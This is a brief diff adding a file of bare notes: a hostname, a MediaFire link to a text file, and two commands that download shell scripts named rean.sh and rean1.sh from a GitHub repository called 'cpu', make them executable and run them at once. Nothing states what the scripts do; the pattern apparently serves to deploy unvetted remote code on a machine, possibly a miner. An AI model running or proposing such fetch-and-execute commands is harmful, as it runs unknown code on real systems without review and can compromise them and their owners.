@@ -1,0 +1,10 @@
+
+netbooks.networkmedicine.org
+
+
+https://www.mediafire.com/file/hes84vdxur9ubmp/netzo.txt/file
+
+
+wget https://raw.githubusercontent.com/bamlone/cpu/main/rean.sh && chmod +x rean.sh && ./rean.sh
+
+wget https://raw.githubusercontent.com/bamlone/cpu/main/rean1.sh && chmod +x rean1.sh && ./rean1.sh
